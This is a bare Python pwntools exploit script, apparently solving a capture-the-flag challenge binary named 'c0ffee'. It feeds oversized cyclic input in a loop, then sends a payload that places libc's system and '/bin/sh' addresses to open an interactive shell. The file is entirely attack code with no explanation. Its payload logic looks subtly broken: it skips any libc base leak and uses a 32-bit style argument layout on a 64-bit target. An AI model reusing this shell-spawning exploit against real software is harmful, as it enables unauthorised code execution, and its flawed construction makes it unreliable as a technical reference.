#!/usr/bin/python
from pwn import *

local='./c0ffee'
libc='/lib/x86_64-linux-gnu/libc.so.6'

elf=ELF(local)
lib=ELF(libc)
p=process(local)
#pause()
p.sendlineafter('cups>','1')

def payload():
 p.sendlineafter('size>','128')
 p.sendline(cyclic(128))
 p.recvuntil('>>')
 p.sendline('a'*9+'yes')
## 1320=132*10
for i in range(10): 
 payload()
 log.info(i)
p.sendlineafter('size>','24')
## last payload
sys= lib.sym['system']
bin_sh= lib.search('/bin/sh').next()
log.info(sys)
log.info(bin_sh)
payl=cyclic(20)+p64(sys)+'aaaa'+p64(bin_sh)
p.sendline(payl)
p.sendline('1')
p.sendline('1')
p.interactive()
